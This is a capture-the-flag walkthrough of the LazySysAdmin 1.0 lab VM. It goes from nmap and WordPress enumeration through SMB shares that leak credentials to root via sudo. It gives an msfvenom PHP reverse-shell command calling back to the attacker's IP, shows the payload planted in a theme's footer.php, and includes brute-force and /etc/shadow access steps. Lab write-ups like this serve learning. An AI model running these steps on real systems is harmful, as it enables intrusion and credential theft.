<h1>LazySysAdmin 1.0 Walkthrough</h1>

Author Description: "Boot2root created out of frustration from failing my first OSCP exam attempt."

Difficulty: Beginner - Intermediate

Challenge: Accepted

I imported to VMware Workstation, using a host only subnet for this and my Kali VM.

Run a quick `netdiscover` to gather the target's IP and an `ifconfig` to confirm my attacker IP.

Now I can really start things off with an Nmap scan.

`nmap -Pn -sT -sV -O 192.168.17.139 -p1-65000`

![Image of Nmap](https://blu0.github.io/LSAWalkthrough/LSAnmap.png)

So there's a few different places to start, but I'll take a look at the website on Port 80 first.

![Image of Site](https://blu0.github.io/LSAWalkthrough/LSAsite.png)

Nothing really jumps out after looking around for a bit, so time for some more web enumeration.

I'll go with trusty old Nikto here, and move to Dirbuster, etc if needed.

`nikto -h 192.168.17.139`

![Image of Nikto](https://blu0.github.io/LSAWalkthrough/LSAnikto.png)

So looking through the results, there are quite a few things to check here. First off, the robots.txt shows the same directories as the Nikto scan, so that's a wash. The `/old/` and `/test/` directories show nothing at all, so moving on. I poked a little bit at the `/myphpadmin/` page but it requires a password. A few guesses at username/password combos proved useless... meh, moving on for now.

There is a WordPress site, but nothing seems to load. Who cares? I’m going to add `/wp-admin/` anyway and see if there is a login page.

Voila!

![Image of Wp-admin](https://blu0.github.io/LSAWalkthrough/LSAwp.png)

WordPress looks like the most viable path at the moment, and it would be a quick reverse shell if I can work my way in.

It's time for some WPScan to see what usernames are there.

![Image of WPscan](https://blu0.github.io/LSAWalkthrough/LSAwpscane.png)

![Image of WPscan2](https://blu0.github.io/LSAWalkthrough/LSAwpscanadmin.png)

So we have Admin and nothing else. Ok then.

Trying some WPScan Brute Force, I scraped the site with Cewl:

`cewl -m 5 http://192.168.17.139/wordpress -w lazycewl.txt`

Then ran it through some mutations with John The Ripper:

`john --wordlist=/root/lazycewl.txt --rules --stdout > lazymutate.txt`

Using WPscan to try and Brute Force the password:

`wpscan -u http://192.168.17.139/wordpress/ -w /roo/lazymutate.txt -U admin`

No hits, and I also tried rockyou for a few minutes before cancelling it. Brute force is probably not the answer at this point, but we can return to it if no other information is found. Maybe the password is somewhere else.

Time to check the SMB port and see if there is any relevant data to be found. I probably could have done this a little earlier and saved some time, but here goes.

`enum4linux -a 192.168.17.139`

![Image of Enum4Linux](https://blu0.github.io/LSAWalkthrough/LASenum4linux.png)

There are a few options, but `share$` looks interesting since it is not a default.

I connect to share as guest.

![Image of SMBClient](https://blu0.github.io/LSAWalkthrough/LSAsmbclient.png)

No problem listing directories or files.

![Image of SMBClient2](https://blu0.github.io/LSAWalkthrough/LSAsmbclient2.png)


The `get` command works, so I grabbed the wp-config.php file and viewed it on my system.

![Image of wp-config](https://blu0.github.io/LSAWalkthrough/LSAwp-config.png)

Trying the password found in the `wp-config.php` file in the WordPress admin panel and what do you know, the password works.

Now it's time for time get a quick reverse shell on the machine. To do this I will generate a Meterpreter shell using the following command (.141 is the Kali machine):

`msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.17.141 LPORT=4444 -f raw > shell.php`

Note: Meterpreter is not really needed, I could have tried any number of php reverse shells, but I wanted the meterpreter one for the `shell` command so that if I do something to botch my shell I can simply end the session instead of havnig to reconnect entirely.

Once the shellcode is generated, I do a little touch up on the format (remove leading `//` and add `?>` to the end), then add to footer.php of the Wordpress theme.

![Image of footer](https://blu0.github.io/LSAWalkthrough/LSAfooter.png)

Get meterpreter ready by confirming all options are set appropriately (Payload/LHOST/LPORT)

![Image of meterpreter](https://blu0.github.io/LSAWalkthrough/LSAmeterpreter.png)

Now type run and reload the wordpress site.

![Image of meterpreter2](https://blu0.github.io/LSAWalkthrough/LSAmeterpreter2.png)

The reverse shell is successful, so I check what directory I'm in, use the `shell` command, get my TTY shell with python using `python -c 'import pty; pty.spawn("/bin/sh")'`, and get some basic system info.

I tried the WordPress password to switch to root, but that's too easy and of course it doesn't work.

Moved to /tmp and did a quick wget from my attack machine (ensure apache is running on Kali) to download the [linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) script. Ran it, but found nothing too obvious at first glance. I'll poke around some more with what I already have and come back to it if I get stuck.

Maybe there is another user in the database or another database.

![Image of mysql](https://blu0.github.io/LSAWalkthrough/LSAmysql.png)

![Image of mysql2](https://blu0.github.io/LSAWalkthrough/LSAmysql2.png)

![Image of mysql3](https://blu0.github.io/LSAWalkthrough/LSAmysql3.png)

Nope, no other users.

What other users are on the system?

![Image of passwd](https://blu0.github.io/LSAWalkthrough/LSApasswd.png)

User `togie` looks interesting. I tried swiching to togie with the WordPress password, but no go.

Did I overlook something previously?

Yes, actually. It occurs to me tht I haven't explored my SMB share nearly enough, so I go back to the SMB share and grab deets.txt

![Image of deets](https://blu0.github.io/LSAWalkthrough/LSAdeets.png)

Now that's promising.

Back to my low priv shell, now I'm able to switch to togie with the newly discovered password, and I see the user is in the sudo group as well.

![Image of su](https://blu0.github.io/LSAWalkthrough/LSAsu.png)

Let's see what I can do with sudo access.

![Image of shadow](https://blu0.github.io/LSAWalkthrough/LSAshadow.png)

Looks like a restricted shell, but this doesn't faze me.

![Image of root](https://blu0.github.io/LSAWalkthrough/LSAroot.png)

Proof.txt is mine, plus I have the root password hash if I want to crack it later.

I could experiment with breaking out of the restricted shell (probably vim would work here), but I didn't bother at this point.


Overall, I think this was a good challenge, and a good reminder to enumerate thoroughly before moving too fast from one phase to the next.
